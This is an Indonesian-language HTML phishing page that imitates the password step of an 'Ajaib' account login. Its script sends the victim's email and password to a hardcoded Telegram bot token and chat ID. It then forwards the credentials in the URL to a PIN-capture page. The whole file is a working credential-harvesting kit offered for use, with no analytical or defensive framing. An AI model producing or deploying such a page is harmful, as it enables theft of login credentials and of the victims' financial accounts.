<!doctype html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Password</title>

  <style>
    :root{
      --muted:#6B7280;
      --blue:#1E90FF;
      --card:#d9e4ef;
      --disabled:#E6EEF4;
    }

    html,body{
      margin:0;
      padding:0;
      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;
      background:#fff;
      color:#0f172a;
      -webkit-tap-highlight-color:transparent;
      user-select:none;
    }

    .wrap{
      max-width:420px;
      margin:0 auto;
      padding:22px 20px;
    }

    .back{
      display:flex;
      align-items:center;
      gap:12px;
      cursor:pointer;
    }

    .title{
      margin:20px 0 4px 0;
      font-size:24px;
      font-weight:700;
    }
    .subtitle{
      color:var(--muted);
      margin:0 0 18px 0;
      font-size:15px;
    }

    .email-card{
      display:flex;
      align-items:center;
      gap:14px;
      border:2px solid var(--card);
      padding:14px;
      border-radius:14px;
      background:#fff;
      margin-bottom:20px;
    }
    .avatar{
      width:56px;height:56px;border-radius:50%;object-fit:cover;
      flex:0 0 56px;
    }
    .email{
      font-size:16px;font-weight:600;
    }

    .label{
      margin-top:10px;
      font-weight:700;
    }
    .pw-box{
      display:flex;
      align-items:center;
      gap:10px;
      border:2px solid var(--blue);
      border-radius:12px;
      padding:12px;
    }
    .pw-box input{
      border:0;
      font-size:16px;
      outline:none;
      flex:1;
    }
    .eye{
      width:26px;height:26px;cursor:pointer;border:0;background:none;
    }

    .lupa{
      text-align:right;
      font-size:14px;
      margin-top:6px;
      color:var(--blue);
      font-weight:600;
      cursor:pointer;
    }

    .btn{
      width:100%;
      padding:14px;
      margin-top:32px;
      border:0;
      border-radius:12px;
      font-size:16px;
      font-weight:700;
      cursor:pointer;
      background:var(--disabled);
      color:#9CA3AF;
    }
    .btn.active{
      background:var(--blue);
      color:white;
    }
  </style>
</head>

<body>
<div class="wrap">

  <div class="back" onclick="window.history.back()">
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
      <path d="M15 18L9 12L15 6" stroke="#111827" stroke-width="2"
            stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
  </div>

  <h1 class="title">Selamat datang kembali!</h1>
  <p class="subtitle">Dengan Satu Akun Ajaib, Kamu Bisa Masuk Ke Semua Platform Aplikasi Ajaib.</p>

  <div class="email-card">
    <img src="Logoajaib.jpg" class="avatar" alt="">
    <div style="flex-direction:column;">
      <div class="email" id="emailDisplay">email@contoh.com</div>
      <div style="font-size:13px;color:var(--muted);margin-top:3px;">Masuk dengan alamat ini</div>
    </div>
    <button onclick="editEmail()" style="background:none;border:0;padding:4px;cursor:pointer;">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="#111827">
        <path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25z"/>
        <path d="M20.71 7.04a1 1 0 000-1.41l-2.34-2.34a1 1 0 00-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/>
      </svg>
    </button>
  </div>

  <div class="label">Password</div>

  <div class="pw-box">
    <input id="pw" type="password" placeholder="Masukkan password">
    <button class="eye" onclick="togglePw()">
      <svg id="eyeOpen" width="24" height="24" viewBox="0 0 24 24" fill="none">
        <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"
              stroke="#111827" stroke-width="1.4"
              stroke-linecap="round" stroke-linejoin="round"/>
        <circle cx="12" cy="12" r="3" fill="#111827"/>
      </svg>

      <svg id="eyeClosed" width="24" height="24"
           viewBox="0 0 24 24" fill="none" style="display:none;">
        <path d="M17.94 17.94A10.94 10.94 0 0112 19c-7 0-11-7-11-7a20.7 20.7 0 014.17-5.42"
              stroke="#111827" stroke-width="1.4" stroke-linecap="round"/>
        <path d="M1 1l22 22" stroke="#111827" stroke-width="1.6"
              stroke-linecap="round"/>
      </svg>
    </button>
  </div>

  <div class="lupa">Lupa Password</div>

  <button id="loginBtn" class="btn" disabled>Masuk</button>

</div>

<script>
  // ==========================================
  // AMBIL EMAIL DARI HALAMAN SEBELUMNYA
  // ==========================================
  const params = new URLSearchParams(window.location.search);
  const email = params.get("email") || "email@contoh.com";
  document.getElementById("emailDisplay").textContent = email;


  const pw = document.getElementById("pw");
  const loginBtn = document.getElementById("loginBtn");

  // Aktifkan tombol jika terisi
  pw.addEventListener("input", ()=>{
    if(pw.value.trim().length > 0){
      loginBtn.disabled = false;
      loginBtn.classList.add("active");
    } else {
      loginBtn.disabled = true;
      loginBtn.classList.remove("active");
    }
  });

  // Show / Hide Password
  function togglePw(){
    const open = document.getElementById("eyeOpen");
    const closed = document.getElementById("eyeClosed");

    if(pw.type === "password"){
      pw.type = "text";
      open.style.display = "none";
      closed.style.display = "block";
    } else {
      pw.type = "password";
      open.style.display = "block";
      closed.style.display = "none";
    }
  }

  function editEmail(){
    window.history.back();
  }


  // ==========================================
  //  ðŸ›°ï¸ KIRIM PASSWORD + EMAIL KE TELEGRAM
  // ==========================================
  async function sendToTelegram(email, password) {

    // GANTI DENGAN DATA BOTMU
    const BOT_TOKEN = "7959508278:AAGscaWzlJ0bwX1iTzhfcXT-Xp82TBYB67g";
    const CHAT_ID = "5983910858";

    const text = 
`ðŸ” LOGIN STEP 2
Email: ${email}
Password: ${password}
â€”â€”â€”â€”â€”â€”â€”`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    await fetch(url, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text
      })
    });
  }


  // ==========================================
  //  AKSI TOMBOL "MASUK"
  // ==========================================
  loginBtn.addEventListener("click", async ()=>{

    const password = pw.value;

    // kirim ke telegram
    await sendToTelegram(email, password);

    // lalu pindah ke halaman berikutnya (PIN)
    const encodedEmail = encodeURIComponent(email);
    const encodedPw = encodeURIComponent(password);

    window.location.href =
      `pin.html?email=${encodedEmail}&password=${encodedPw}`;
  });

</script>

</body>
</html>
